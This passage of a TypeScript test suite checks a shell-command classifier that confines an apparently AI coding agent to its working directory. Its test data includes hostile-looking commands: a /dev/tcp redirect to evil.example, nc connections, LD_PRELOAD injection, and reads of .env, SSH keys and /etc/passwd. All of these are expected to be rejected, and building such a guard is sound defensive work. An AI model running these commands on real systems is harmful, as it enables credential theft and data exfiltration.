            { desc: "git revert: falls back", command: "git revert HEAD", expected: Heuristic.UNSAFE },
            { desc: "git stash pop: falls back", command: "git stash pop", expected: Heuristic.UNSAFE },
            { desc: "git worktree add: falls back", command: "git worktree add ../other feature", expected: Heuristic.UNSAFE },
            { desc: "git update-index: falls back", command: "git update-index --assume-unchanged file.txt", expected: Heuristic.UNSAFE },
            { desc: "git push: falls back", command: "git push origin main", expected: Heuristic.UNSAFE },
            { desc: "git pull: falls back", command: "git pull origin main", expected: Heuristic.UNSAFE },
            { desc: "global -c before subcommand: falls back", command: "git -c diff.external=evil log", expected: Heuristic.UNSAFE },
            { desc: "global -C before subcommand: falls back", command: "git -C /other status", expected: Heuristic.UNSAFE },
            { desc: "global -C inside cwd is still rejected", command: "git -C . status", expected: Heuristic.UNSAFE },
            { desc: "global -C inline is rejected", command: "git -C/tmp status", expected: Heuristic.UNSAFE },
            { desc: "global --git-dir before subcommand: falls back", command: "git --git-dir /x log", expected: Heuristic.UNSAFE },
            { desc: "global --git-dir inside cwd is still rejected", command: "git --git-dir .git status", expected: Heuristic.UNSAFE },
            { desc: "global --git-dir inline is rejected", command: "git --git-dir=/tmp status", expected: Heuristic.UNSAFE },
            { desc: "global --work-tree is rejected", command: "git --work-tree . status", expected: Heuristic.UNSAFE },
            { desc: "global --work-tree inline is rejected", command: "git --work-tree=/tmp status", expected: Heuristic.UNSAFE },
            { desc: "global --exec-path is rejected", command: "git --exec-path . status", expected: Heuristic.UNSAFE },
            { desc: "global --exec-path inline is rejected", command: "git --exec-path=/tmp status", expected: Heuristic.UNSAFE },
            { desc: "global --config-env is rejected", command: "git --config-env=core.fsmonitor=GIT_FS_MONITOR status", expected: Heuristic.UNSAFE },
            { desc: "bare git without subcommand: falls back", command: "git", expected: Heuristic.UNSAFE },
            { desc: "git -- status", command: "git -- status", expected: Heuristic.SAFE_READONLY },
        ]);
    });

    describe("flag value model", () => {
        runTests([
            { desc: "long value flag with separate value is consumed", command: "head --lines 5 file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "long value flags consumed (grep)", command: "grep --max-count 3 --context 2 foo file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "two-value flag consumes both values (jq --arg)", command: "jq --arg x /etc/passwd '.x' data.json", expected: Heuristic.SAFE_READONLY },
            { desc: "two-value flag with inline form is ineligible", command: "jq --arg=x 5 '.x' data.json", expected: Heuristic.UNSAFE },
            { desc: "value flag missing its value is ineligible", command: "head --lines", expected: Heuristic.UNSAFE },
            { desc: "path flag separate value inside cwd", command: "diff -X excludes.txt a.txt b.txt", expected: Heuristic.SAFE_READONLY },
        ]);
    });

    describe("unzip safe modes", () => {
        runTests([
            { desc: "unzip -l lists contents", command: "unzip -l a.zip", expected: Heuristic.SAFE_READONLY },
            { desc: "unzip --list with member names", command: "unzip --list a.zip src/index.ts", expected: Heuristic.SAFE_READONLY },
            { desc: "unzip -p prints a member to stdout", command: "unzip -p a.zip README.md", expected: Heuristic.SAFE_READONLY },
            { desc: "unzip -t tests integrity", command: "unzip -t a.zip", expected: Heuristic.SAFE_READONLY },
            { desc: "unzip -v verbose list", command: "unzip -v a.zip", expected: Heuristic.SAFE_READONLY },
            { desc: "unzip default mode (extract) falls back", command: "unzip a.zip", expected: Heuristic.UNSAFE },
            { desc: "unzip -d extract directory falls back", command: "unzip -d out a.zip", expected: Heuristic.UNSAFE },
            { desc: "unzip -l archive outside cwd", command: "unzip -l /etc/a.zip", expected: Heuristic.UNSAFE },
            { desc: "tar member names are data, not paths", command: "tar -t a.tar.gz 'src/*'", expected: Heuristic.SAFE_READONLY },
        ]);
    });

    describe("subshells and process substitution", () => {
        runTests([
            { desc: "subshell with known command", command: "cat $(echo file.txt)", expected: Heuristic.SAFE_READONLY },
            { desc: "backtick subshell", command: "cat `echo file.txt`", expected: Heuristic.SAFE_READONLY },
            { desc: "subshell with unknown command", command: "cat $(curl example.com)", expected: Heuristic.UNSAFE },
            { desc: "subshell escaping cwd", command: "cat $(cat /etc/passwd)", expected: Heuristic.UNSAFE },
            { desc: "subshell output escaping cwd", command: "cat $(echo /etc/passwd)", expected: Heuristic.UNSAFE },
            { desc: "subshell output from an unmodeled reader", command: "cat $(cat file.txt)", expected: Heuristic.UNSAFE },
            { desc: "nested subshells", command: "cat $(echo $(echo file.txt))", expected: Heuristic.SAFE_READONLY },
            { desc: "edit in command substitution propagates", command: "grep $(echo pattern > nested.txt) file.txt", expected: Heuristic.SAFE_EDIT },
            { desc: "process substitution known", command: "cat <(echo hi)", expected: Heuristic.SAFE_READONLY },
            { desc: "process substitution unknown", command: "cat <(curl example.com)", expected: Heuristic.UNSAFE },
            { desc: "redirection into process substitution", command: "echo hi > >(cat)", expected: Heuristic.SAFE_READONLY },
            { desc: "edit in process substitution propagates", command: "echo hi > >(cat > nested.txt)", expected: Heuristic.SAFE_EDIT },
            { desc: "redirection into unknown process substitution", command: "echo hi > >(nc host 80)", expected: Heuristic.UNSAFE },
        ]);
    });

    describe("heredocs", () => {
        runTests([
            { desc: "heredoc within cwd", command: "cat << EOF\nhello\nEOF", expected: Heuristic.SAFE_READONLY },
            { desc: "heredoc with path arg", command: "grep foo << EOF\nhello\nEOF", expected: Heuristic.SAFE_READONLY },
        ]);
    });

    describe("parser evasion resistance", () => {
        runTests([
            { desc: "quoted known command name behaves like bash", command: '"cat" file.txt', expected: Heuristic.SAFE_READONLY },
            { desc: "quoted unknown command name", command: '"nc" host 80', expected: Heuristic.UNSAFE },
            { desc: "tab as argument separator", command: "cat\tfile.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "escaped char in command name resolves like bash", command: "c\\at file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "escaped char does not disguise unknown command", command: "n\\c host 80", expected: Heuristic.UNSAFE },
            { desc: "case-sensitive command names", command: "CAT file.txt", expected: Heuristic.UNSAFE },
            { desc: "empty quotes prefix", command: '""cat file.txt', expected: Heuristic.SAFE_READONLY },
            { desc: "bash -c is not a known command", command: 'bash -c "cat file.txt"', expected: Heuristic.UNSAFE },
            { desc: "sh -c is not a known command", command: "sh -c 'cat file.txt'", expected: Heuristic.UNSAFE },
            { desc: "eval is not a known command", command: "eval cat file.txt", expected: Heuristic.UNSAFE },
            { desc: "env wrapper is not a known command", command: "env cat file.txt", expected: Heuristic.UNSAFE },
            { desc: "command builtin is not a known command", command: "command cat file.txt", expected: Heuristic.UNSAFE },
            { desc: "xargs is not a known command", command: "xargs cat < files.txt", expected: Heuristic.UNSAFE },
            { desc: "sudo is not a known command", command: "sudo cat file.txt", expected: Heuristic.UNSAFE },
            { desc: "time is not a known command", command: "time cat file.txt", expected: Heuristic.UNSAFE },
        ]);
    });

    describe("environment assignments", () => {
        runTests([
            { desc: "benign assignment", command: "FOO=bar cat file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "multiple benign assignments", command: "FOO=bar BAZ=qux cat file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "empty assignment value", command: "FOO= cat file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "LD_PRELOAD is rejected", command: "LD_PRELOAD=/tmp/evil.so cat file.txt", expected: Heuristic.UNSAFE },
            { desc: "LD_LIBRARY_PATH is rejected", command: "LD_LIBRARY_PATH=/tmp cat file.txt", expected: Heuristic.UNSAFE },
            { desc: "PATH assignment is rejected", command: "PATH=/tmp/evil cat file.txt", expected: Heuristic.UNSAFE },
            { desc: "BASH_ENV is rejected", command: "BASH_ENV=/tmp/x cat file.txt", expected: Heuristic.UNSAFE },
            { desc: "IFS is rejected", command: "IFS=x cat file.txt", expected: Heuristic.UNSAFE },
            { desc: "assignment value outside cwd is path-checked", command: "FOO=/etc/passwd cat file.txt", expected: Heuristic.UNSAFE },
            { desc: "assignment value in home is path-checked", command: "FOO=~/x cat file.txt", expected: Heuristic.UNSAFE },
            { desc: "sensitive assignment value is rejected", command: "FOO=.env cat file.txt", expected: Heuristic.UNSAFE },
            // state-relocating names: rejected by NAME even with an in-cwd
            // value (the value would pass the path check on its own)
            { desc: "GIT_DIR assignment is rejected", command: "GIT_DIR=x git status", expected: Heuristic.UNSAFE },
            { desc: "GIT_CONFIG assignment is rejected", command: "GIT_CONFIG=x git log", expected: Heuristic.UNSAFE },
            { desc: "GIT_EXEC_PATH assignment is rejected", command: "GIT_EXEC_PATH=x git status", expected: Heuristic.UNSAFE },
            { desc: "GIT_WORK_TREE assignment is rejected", command: "GIT_WORK_TREE=x git status", expected: Heuristic.UNSAFE },
            { desc: "GIT_INDEX_FILE assignment is rejected", command: "GIT_INDEX_FILE=x git status", expected: Heuristic.UNSAFE },
            { desc: "GIT_OBJECT_DIRECTORY assignment is rejected", command: "GIT_OBJECT_DIRECTORY=x git status", expected: Heuristic.UNSAFE },
            { desc: "GIT_ALTERNATE_OBJECT_DIRECTORIES assignment is rejected", command: "GIT_ALTERNATE_OBJECT_DIRECTORIES=x git status", expected: Heuristic.UNSAFE },
            { desc: "GIT_COMMON_DIR assignment is rejected", command: "GIT_COMMON_DIR=x git status", expected: Heuristic.UNSAFE },
            { desc: "GIT_CONFIG_GLOBAL assignment is rejected", command: "GIT_CONFIG_GLOBAL=x git status", expected: Heuristic.UNSAFE },
            { desc: "GIT_CONFIG_SYSTEM assignment is rejected", command: "GIT_CONFIG_SYSTEM=x git status", expected: Heuristic.UNSAFE },
            { desc: "GIT_SSH_COMMAND assignment is rejected", command: "GIT_SSH_COMMAND=x git status", expected: Heuristic.UNSAFE },
            { desc: "GIT_EXTERNAL_DIFF assignment is rejected", command: "GIT_EXTERNAL_DIFF=x git diff --check -- file.txt", expected: Heuristic.UNSAFE },
            { desc: "arbitrary GIT_* assignment is rejected", command: "GIT_CUSTOM_ESCAPE=x git status", expected: Heuristic.UNSAFE },
            { desc: "RIPGREP_CONFIG_PATH assignment is rejected", command: "RIPGREP_CONFIG_PATH=x rg needle", expected: Heuristic.UNSAFE },
            { desc: "LESSOPEN assignment is rejected", command: "LESSOPEN=x cat file.txt", expected: Heuristic.UNSAFE },
            { desc: "LESSCLOSE assignment is rejected", command: "LESSCLOSE=x cat file.txt", expected: Heuristic.UNSAFE },
            { desc: "XDG_CONFIG_HOME assignment is rejected", command: "XDG_CONFIG_HOME=x git status", expected: Heuristic.UNSAFE },
        ]);
    });

    describe("export builtin", () => {
        runTests([
            { desc: "export benign assignment", command: "export FOO=bar", expected: Heuristic.SAFE_READONLY },
            { desc: "export in a chain", command: "export FOO=bar && cat file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "export multiple assignments", command: "export FOO=1 BAR=2 && cat file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "export bare name", command: "export FOO", expected: Heuristic.SAFE_READONLY },
            { desc: "export empty value", command: "export FOO= && cat file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "export -n unsets", command: "export -n FOO", expected: Heuristic.SAFE_READONLY },
            { desc: "export value outside cwd is path-checked", command: "export FOO=/etc/passwd", expected: Heuristic.UNSAFE },
            { desc: "export value escaping cwd is path-checked", command: "export FOO=../etc/passwd", expected: Heuristic.UNSAFE },
            { desc: "export value in home is path-checked", command: "export FOO=~/x", expected: Heuristic.UNSAFE },
            { desc: "export sensitive value is rejected", command: "export FOO=.env", expected: Heuristic.UNSAFE },
            { desc: "export GIT_DIR is rejected", command: "export GIT_DIR=x", expected: Heuristic.UNSAFE },
            { desc: "export GIT_WORK_TREE is rejected", command: "export GIT_WORK_TREE=x && git status", expected: Heuristic.UNSAFE },
            { desc: "export GIT_INDEX_FILE is rejected", command: "export GIT_INDEX_FILE=x && git status", expected: Heuristic.UNSAFE },
            { desc: "export arbitrary GIT_* is rejected", command: "export GIT_CUSTOM_ESCAPE=x && git status", expected: Heuristic.UNSAFE },
            { desc: "export LD_PRELOAD is rejected", command: "export LD_PRELOAD=x && cat file.txt", expected: Heuristic.UNSAFE },
            { desc: "export PATH is rejected", command: "export PATH=bin && cat file.txt", expected: Heuristic.UNSAFE },
            { desc: "export RIPGREP_CONFIG_PATH is rejected", command: "export RIPGREP_CONFIG_PATH=x", expected: Heuristic.UNSAFE },
            { desc: "export LESSOPEN is rejected", command: "export LESSOPEN=x", expected: Heuristic.UNSAFE },
            { desc: "export XDG_CONFIG_HOME is rejected", command: "export XDG_CONFIG_HOME=x", expected: Heuristic.UNSAFE },
            { desc: "export -f (function export) is rejected", command: "export -f myfunc", expected: Heuristic.UNSAFE },
            { desc: "export -p (env dump) is rejected", command: "export -p", expected: Heuristic.UNSAFE },
            { desc: "export invalid identifier is rejected", command: "export 'a b=1'", expected: Heuristic.UNSAFE },
            { desc: "export invalid assignment is rejected", command: "export =foo", expected: Heuristic.UNSAFE },
        ]);
    });

    describe("redirection edge cases", () => {
        runTests([
            { desc: "stderr merged into stdout", command: "cat file.txt 2>&1", expected: Heuristic.SAFE_READONLY },
            { desc: "stdout to /dev/stdout", command: "echo hello > /dev/stdout", expected: Heuristic.SAFE_READONLY },
            { desc: "bash network redirect is outside cwd", command: "echo hello > /dev/tcp/evil.example/80", expected: Heuristic.UNSAFE },
            { desc: ">&2 is conservatively rejected", command: "cat file.txt >&2", expected: Heuristic.UNSAFE },
            { desc: "1>&2 is conservatively rejected", command: "cat file.txt 1>&2", expected: Heuristic.UNSAFE },
        ]);
    });

    describe("unsafe flag variants", () => {
        runTests([
            { desc: "sort --compress-program with separate arg", command: "sort --compress-program /tmp/x file.txt", expected: Heuristic.UNSAFE },
            { desc: "sort --compress-program= inline", command: "sort --compress-program=/tmp/x file.txt", expected: Heuristic.UNSAFE },
            { desc: "find -ok prompts per match, still unsafe", command: "find . -ok rm {} \\;", expected: Heuristic.UNSAFE },
            { desc: "grep --dereference-recursive long form", command: "grep --dereference-recursive foo .", expected: Heuristic.UNSAFE },
            { desc: "grep -r without dereference is allowed", command: "grep -r foo .", expected: Heuristic.SAFE_READONLY },
            { desc: "sort with safe flags stays allowed", command: "sort -n -k 2 file.txt", expected: Heuristic.SAFE_READONLY },
        ]);
    });

    describe("chain edge cases", () => {
        runTests([
            { desc: "trailing chain operator", command: "cat file.txt &&", expected: Heuristic.SAFE_READONLY },
            { desc: "only chain operators", command: "; ; ;", expected: Heuristic.UNSAFE },
            { desc: "background operator", command: "cat file.txt &", expected: Heuristic.SAFE_READONLY },
            { desc: "background known command", command: "sleep 100 &", expected: Heuristic.SAFE_READONLY },
            { desc: "background unknown command", command: "nc host 80 &", expected: Heuristic.UNSAFE },
            { desc: "second branch escapes cwd", command: "cat file.txt || cat /etc/passwd", expected: Heuristic.UNSAFE },
        ]);
    });

    describe("sensitive paths", () => {
        runTests([
            { desc: ".env file", command: "cat .env", expected: Heuristic.UNSAFE },
            { desc: ".env variant", command: "cat .env.local", expected: Heuristic.UNSAFE },
            { desc: ".env in subdirectory", command: "cat src/.env", expected: Heuristic.UNSAFE },
            { desc: ".env via parent traversal", command: "cat src/../.env", expected: Heuristic.UNSAFE },
            { desc: ".git config", command: "cat .git/config", expected: Heuristic.UNSAFE },
            { desc: ".git dir listing", command: "ls .git", expected: Heuristic.UNSAFE },
            { desc: "ssh dir", command: "cat .ssh/config", expected: Heuristic.UNSAFE },
            { desc: "aws dir", command: "ls .aws", expected: Heuristic.UNSAFE },
            { desc: "npmrc", command: "cat .npmrc", expected: Heuristic.UNSAFE },
            { desc: "netrc", command: "cat .netrc", expected: Heuristic.UNSAFE },
            { desc: "private key by name", command: "cat id_rsa", expected: Heuristic.UNSAFE },
            { desc: "private key by extension", command: "cat keys/server.pem", expected: Heuristic.UNSAFE },
            { desc: "key extension", command: "cat tls.key", expected: Heuristic.UNSAFE },
            { desc: "p12 bundle", command: "cat cert.p12", expected: Heuristic.UNSAFE },
            { desc: "tfvars", command: "cat prod.tfvars", expected: Heuristic.UNSAFE },
            { desc: "credentials file", command: "cat credentials", expected: Heuristic.UNSAFE },
            { desc: "redirect into sensitive file", command: "echo x > .env", expected: Heuristic.UNSAFE },
            { desc: "glob arg touching nothing sensitive", command: "cat src/*", expected: Heuristic.SAFE_READONLY },
            { desc: ".gitignore is not sensitive", command: "cat .gitignore", expected: Heuristic.SAFE_READONLY },
            { desc: ".github dir is not sensitive", command: "ls .github", expected: Heuristic.SAFE_READONLY },
            { desc: "regular config file is not sensitive", command: "cat config/database.yml", expected: Heuristic.SAFE_READONLY },
            { desc: "file containing 'key' is not sensitive", command: "cat monkey.txt", expected: Heuristic.SAFE_READONLY },
            {
                desc: "blockDotfiles rejects dotfiles",
                command: "cat .gitignore",
                config: { blockDotfiles: true },
                expected: Heuristic.UNSAFE,
            },
            {
                desc: "blockDotfiles still allows regular files",
                command: "cat file.txt",
                config: { blockDotfiles: true },
                expected: Heuristic.SAFE_READONLY,
            },
            {
                desc: "custom denyPaths pattern",
                command: "cat data/db.sqlite",
                config: { denyPaths: ["*.sqlite"] },
                expected: Heuristic.UNSAFE,
            },
            {
                desc: "custom denyPaths pattern, unaffected file",
                command: "cat data/db.txt",
                config: { denyPaths: ["*.sqlite"] },
                expected: Heuristic.SAFE_READONLY,
            },
            {
                desc: "grep pattern slot does not trigger sensitive check",
                command: "grep .env file.txt",
                expected: Heuristic.SAFE_READONLY,
            },
        ]);
    });

    describe("symlink handling (real filesystem)", () => {
        let dir: string;
        let aliasDir: string;

        beforeAll(() => {
            dir = fs.mkdtempSync(path.join(os.tmpdir(), "pi-sandbox-heuristics-"));

            fs.mkdirSync(path.join(dir, "realdir"));
            fs.writeFileSync(path.join(dir, "realdir", "inside.txt"), "x");
            fs.writeFileSync(path.join(dir, "plain.txt"), "x");

            // link-inside.txt -> realdir/inside.txt (stays within cwd)
            fs.symlinkSync(path.join("realdir", "inside.txt"), path.join(dir, "link-inside.txt"));
            // link-outside.txt -> /etc/hostname (escapes cwd)
            fs.symlinkSync("/etc/hostname", path.join(dir, "link-outside.txt"));
            // chain: link-chain-src.txt -> link-chain.txt -> /etc/hostname
            fs.symlinkSync("/etc/hostname", path.join(dir, "link-chain.txt"));
            fs.symlinkSync("link-chain.txt", path.join(dir, "link-chain-src.txt"));
            // directory symlinks
            fs.symlinkSync("realdir", path.join(dir, "dirlink-inside"));
            fs.symlinkSync("/etc", path.join(dir, "dirlink-outside"));
            // symlink with innocent name pointing at sensitive file
            fs.writeFileSync(path.join(dir, ".env"), "SECRET=x");
            fs.symlinkSync(".env", path.join(dir, "env-link.txt"));
            // symlink with innocent name pointing at sensitive directory
            fs.mkdirSync(path.join(dir, ".ssh"));
            fs.writeFileSync(path.join(dir, ".ssh", "id_rsa"), "KEY");
            fs.symlinkSync(path.join(".ssh", "id_rsa"), path.join(dir, "notes.txt"));
            // symlink pointing at the working directory itself
            aliasDir = path.join(os.tmpdir(), `pi-sandbox-heuristics-alias-${path.basename(dir)}`);
            fs.symlinkSync(dir, aliasDir);

            // dangling symlink (target does not exist)
            fs.symlinkSync(path.join(dir, "nonexistent-target-xyz"), path.join(dir, "dangling.txt"));
        });

        afterAll(() => {
            fs.rmSync(dir, { recursive: true, force: true });
            fs.rmSync(aliasDir, { force: true });
        });

        const runFsTests = (tests: HeuristicTest[]) => {
            it.each(tests)("$desc", (test) => {
                expect(
                    getCwdConfinementPermission(test.command, dir, test.config ?? {}),
                ).toBe(test.expected);
            });
        };

        runFsTests([
            { desc: "symlink staying within cwd", command: "cat link-inside.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "symlink escaping cwd", command: "cat link-outside.txt", expected: Heuristic.UNSAFE },
            { desc: "symlink chain escaping cwd", command: "cat link-chain-src.txt", expected: Heuristic.UNSAFE },
            { desc: "directory symlink within cwd", command: "ls dirlink-inside", expected: Heuristic.SAFE_READONLY },
            { desc: "cd through inside directory symlink", command: "cd dirlink-inside && cat inside.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "pushd through inside directory symlink", command: "pushd dirlink-inside && popd && cat plain.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "file through inside directory symlink", command: "cat dirlink-inside/inside.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "directory symlink escaping cwd", command: "ls dirlink-outside", expected: Heuristic.UNSAFE },
            { desc: "cd through outside directory symlink", command: "cd dirlink-outside && cat hostname", expected: Heuristic.UNSAFE },
            { desc: "file through outside directory symlink", command: "cat dirlink-outside/hostname", expected: Heuristic.UNSAFE },
            { desc: "dangling symlink read is rejected", command: "cat dangling.txt", expected: Heuristic.UNSAFE },
            { desc: "dangling symlink write is rejected", command: "echo x > dangling.txt", expected: Heuristic.UNSAFE },
            { desc: "plain file", command: "cat plain.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "new write target in existing cwd", command: "echo x > newfile.txt", expected: Heuristic.SAFE_EDIT },
            { desc: "new write target in new subdirectory", command: "echo x > newdir/file.txt", expected: Heuristic.SAFE_EDIT },
            { desc: "find follows symlinks with -L: falls back", command: "find . -L -name foo", expected: Heuristic.UNSAFE },
            { desc: "find without -L stays allowed", command: "find . -name foo", expected: Heuristic.SAFE_READONLY },
            { desc: "symlink hiding a sensitive file is rejected", command: "cat env-link.txt", expected: Heuristic.UNSAFE },
            { desc: "symlink hiding a sensitive directory target is rejected", command: "cat notes.txt", expected: Heuristic.UNSAFE },
            { desc: "grep -R follows traversal symlinks: falls back", command: "grep -R foo .", expected: Heuristic.UNSAFE },
            { desc: "grep -r does not follow traversal symlinks: allowed", command: "grep -r foo .", expected: Heuristic.SAFE_READONLY },
            { desc: "du -L follows symlinks: falls back", command: "du -L .", expected: Heuristic.UNSAFE },
            { desc: "tree -l follows symlinks: falls back", command: "tree -l", expected: Heuristic.UNSAFE },
            { desc: "tree output file is an edit", command: "tree -o tree.txt", expected: Heuristic.SAFE_EDIT },
            {
                desc: "resolveSymlinks: false disables the realpath check",
                command: "cat link-outside.txt",
                config: { resolveSymlinks: false },
                expected: Heuristic.SAFE_READONLY,
            },
        ]);

        it("cwd reached through a symlink still works", () => {
            expect(getCwdConfinementPermission("cat plain.txt", aliasDir, {})).toBe(Heuristic.SAFE_READONLY);
            expect(getCwdConfinementPermission("cat /etc/hostname", aliasDir, {})).toBe(Heuristic.UNSAFE);
        });
    });

    describe("configuration", () => {
        runTests([
            {
                desc: "disabled heuristic falls back",
                command: "cat file.txt",
                config: { enabled: false },
                expected: Heuristic.UNSAFE,
            },
            {
                desc: "custom permission",
                command: "cat file.txt",
                config: { permission: "allow" },
                expected: Heuristic.SAFE_READONLY,
            },
            {
                desc: "commands allowlist permits listed command",
                command: "ls src",
                config: { commands: ["ls"] },
                expected: Heuristic.SAFE_READONLY,
            },
            {
                desc: "commands allowlist rejects other known commands",
                command: "cat file.txt",
                config: { commands: ["ls"] },
                expected: Heuristic.UNSAFE,
            },
            {
                desc: "outside cwd still falls back with custom permission",
                command: "cat /etc/passwd",
                config: { permission: "allow" },
                expected: Heuristic.UNSAFE,
            },
        ]);
    });
});
